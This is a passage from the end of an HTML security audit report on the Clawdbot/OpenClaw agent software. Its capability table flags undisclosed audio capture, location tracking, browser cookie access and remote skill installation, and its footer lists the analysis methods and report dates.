          <td>Audio monitoring</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>Swabble ambient audio capture</td>
        </tr>
        <tr>
          <td>Location tracking</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>location.get on iOS/Android</td>
        </tr>
        <tr>
          <td>Browser session access</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>Cookies, localStorage, sessionStorage via CDP</td>
        </tr>
        <tr>
          <td>Remote code installation</td>
          <td><span class="tag tag-red">YES</span></td>
          <td>skills.install via gateway</td>
        </tr>
        <tr>
          <td>Data path to local gateway</td>
          <td><span class="tag tag-yellow">YES*</span></td>
          <td>WebSocket to localhost gateway (no external C2 found)</td>
        </tr>
        <tr>
          <td>Informed user consent</td>
          <td><span class="tag tag-red">NO</span></td>
          <td>Capabilities not disclosed in README/docs</td>
        </tr>
      </table>
    </div>
  </div>

  <div class="footer">
    <p><strong>Report generated:</strong> January 28, 2026 (Updated January 30, 2026 with dynamic runtime analysis confirming credential collection, network binding analysis showing localhost-only gateway, and nuanced findings)</p>
    <p><strong>Clawdbot version analyzed:</strong> 2026.1.24-3</p>
    <p><strong>Repository:</strong> <a href="https://github.com/openclaw/openclaw" style="color: #58a6ff;">https://github.com/openclaw/openclaw</a></p>
    <p><strong>Analysis method:</strong> Static analysis of public GitHub repository + dynamic runtime analysis with network/filesystem monitoring (mitmproxy, fswatch, lsof, tcpdump)</p>
    <p style="margin-top: 16px; color: #f85149;"><strong>SHA256:</strong> <code>5ebe61a486321518e452e3059f55c0918b363ba6e14c44e25f77932034f039b5</code></p>
  </div>
</body>
</html>
